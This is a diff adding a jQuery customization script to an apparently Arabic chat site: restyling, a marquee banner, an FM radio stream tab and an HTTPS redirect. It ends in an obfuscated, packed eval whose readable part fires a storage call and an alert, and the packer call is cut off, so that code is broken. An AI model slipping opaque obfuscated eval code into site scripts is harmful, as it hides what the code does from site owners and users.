@@ -1,0 +1,16 @@
+try{$('.u-msg.dots').removeClass('dots');$(".ubnr").remove();$(`<link rel="stylesheet" href="https://rawcdn.githack.com/ita7a/chatt7/bd07169ece50f9e9c09a8618ff90355049d350c9/chat.css"></style>`).insertBefore("body");$('.hand.nosel.fl.uzr.border').css({'margin':'1px 0',borderRight:'1px solid #EDEDED',borderLeft:'1px solid #adadad',borderTop:'1px solid #EDEDED',borderBottom:'1px solid #EDEDED',paddingTop:'3px',borderRadius:'5px'});$(`<link href="https://fonts.googleapis.com/css?family=Changa" rel="stylesheet">
+<marquee direction="right" width="65%" " id="ita7a" direction="right" style="margin-bottom: -7px;font-family: 'Changa', sans-serif; height: 20px;" onmouseover="this.stop()" onmouseout="this.start()" scrolldelay="0" scrollamount="5"> iTa7a.CoM | شات التحلية  </marquee></font></b></td>
+`).insertBefore('span.s1.fa.fa-user.label.badgex.label-as-badge.label-success');$('.room.borderg.hand.nosel.fl').css({'margin':'1px 0',borderRight:'3px solid #EDEDED',borderLeft:'3px solid #EDEDED',borderTop:'1px solid #EDEDED',borderBottom:'1px solid #EDEDED',paddingTop:'3px',borderRadius:'5px'});$('.fr.borderg a').text('دوك موبايل')
+$("a.label.label-primary.fl > img.fl").replaceWith('<img src="" class="fl" style="margin-right: 0px; width: 0px;">');$('.checkbox label').html(`<input id="stealth" type="checkbox" value=""><img id="as13" src="" width="70%" style="">`)
+$('.dpnl').append(` <div id="mic" style="height: 100%;width:100%;" class="break light tab-pane border"><input type="Muhanad" name="FirstName" value="FM اذاعة التحلية ">
+<audio class="wp-audio-shortcode" id="audio-236-1" preload="none" style="width: 100%;" controls="controls"><source type="audio/mpeg" src="http://curiosity.shoutca.st:6035/ ؛"><a href="http://curiosity.shoutca.st:6035/ ؛</a></audio>
+
+<center></center></center>
+
+</div>`);
+
+$('#d0').append(`<label title="الاذاعه" href="#" onclick="$('.pnhead').text($(this).attr('title'));hl($(this),'primary');setTimeout(function(){$('#mic').scrollTop(0);},100);$('.dpnl').show();"
+data-toggle="tab" data-target="#mic"  class="ae fa label label-primary fa-microphone ">FM</label>`);;if(location.protocol!='https:'){location.protocol='https:';}
+if(getUrlParameter('enter')!=null){location.href='/';}
+AddMsg_=AddMsg;AddMsg=function(wid,data){data.msg=data.msg.replace(/\u102C/g,"");return AddMsg_(wid,data);}
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('G d=["\\C\\i\\c\\C\\H","\\l\\c\\8\\m\\7\\I\\J","\\i\\j\\K","\\L\\6\\n\\e\\9\\f\\a\\M\\N\\6\\e\\o\\6\\p\\n\\a\\6\\9\\a\\9\\a\\r\\f\\s\\6\\O\\p\\f\\t\\6\\D\\q\\f\\r\\6\\P\\6\\Q\\9\\k\\t\\n\\6\\9\\9\\a\\k\\k\\k\\o\\q\\u\\e\\6\\p\\t\\a\\6\\9\\o\\6\\q\\R\\s\\r\\6\\D\\a\\f\\u\\e\\6\\9\\a\\k\\o\\q\\u\\e\\6\\f\\n\\e\\6\\9\\a\\p\\f\\9\\e\\s\\6","\\j\\8","\\6\\v\\c\\w\\x\\i\\S\\6\\b\\m\\7\\7\\j\\8\\g\\b\\7\\8\\g\\b\\7\\8\\y\\z\\h\\c\\l\\A\\h\\B\\6\\E\\v\\c\\w\\x\\i\\T\\6\\b\\m\\7\\7\\j\\8\\g\\b\\7\\8\\g\\b\\7\\8\\y\\z\\h\\c\\l\\A\\h\\B\\6\\E\\6\\v\\c\\w\\x\\i\\U\\6\\b\\m\\7\\7\\j\\8\\g\\b\\7\\8\\g\\b\\7\\8\\y\\z\\h\\c\\l\\A\\h\\B"];$(d[5])[d[4]](d[0],F(){V(F(){W[d[2]](d[1]);X(d[3])},Y)})
